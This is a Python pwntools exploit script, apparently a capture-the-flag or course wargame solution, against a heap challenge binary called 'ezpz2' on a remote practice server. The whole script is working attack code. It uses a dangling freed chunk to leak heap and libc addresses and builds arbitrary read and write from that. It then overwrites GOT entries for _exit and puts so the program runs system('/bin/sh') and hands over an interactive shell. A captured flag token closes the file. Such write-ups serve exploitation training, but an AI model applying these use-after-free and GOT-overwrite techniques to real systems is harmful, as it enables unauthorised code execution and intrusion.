#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf
    prog  = "./ezpz2"    

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 8003

        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog, """ c """)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

def create():
    p.sendlineafter("):", "C")

def destroy(id):
    p.sendlineafter("):", "D")
    p.sendlineafter("id:", str(id))

def set(id, question):
    p.sendlineafter("):", "S")
    p.sendlineafter("id:", str(id))
    p.sendlineafter("question:", question)

def ask(id):
    p.sendlineafter("):", "A")
    p.sendlineafter("id:", str(id))
    p.recvuntil("'")
    return p.recvuntil("'", drop=True)

# Writes a string to the supplied memory address
def write_memory(src, dest):
    set_memory(src)
    set(1, dest)

# Reads memory at the supplied address
def read_memory(src):
    set_memory(src)
    return u32(ask("1")[:4])

# Sets the question pointer of Q1 to be the supplied memory address
def set_memory(src):
    payload = p32(0x0) * 0x7
    payload += p32(0x00000021)
    payload += p32(heap_addr)
    payload += p32(0x0) * 0x5
    payload += p32(src)
    payload += p32(0x00000021)
    set(0, payload)

start()

create()
create()
destroy(0)
destroy(1)

heap_addr = u32(ask(1)[:4])
libc_base = read_memory(elf.got["puts"]) - 0x067c10

# The general idea is to cause the call of puts(banner) in the print_banner() function to be overwritten such that it will invoke system('bin/sh'), then to overwrite the _exit() function to print_banner().
# This will cause a call to _exit() to instead pop a shell
write_memory(elf.got["_exit"], p32(elf.symbols["print_banner"]))
write_memory(elf.symbols["banner"], b"/bin/sh\x00")
write_memory(elf.got["puts"], p32(libc_base + 0x03d250))

# An invalid command that will invoke _exit()
destroy(44)

p.interactive()
p.close()

# FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy1lenB6MiIsImlwIjoiMTAxLjE2NC4zMy4yMTkiLCJzZXNzaW9uIjoiYzcwY2Q2ODAtMDEyZi00ZmZiLTliYmItYWNmZmNhMTljZGQyIn0.cuU8HM08HtQrLuJ2zeT69zz9F9nXrzz8vBXOj23qhoY}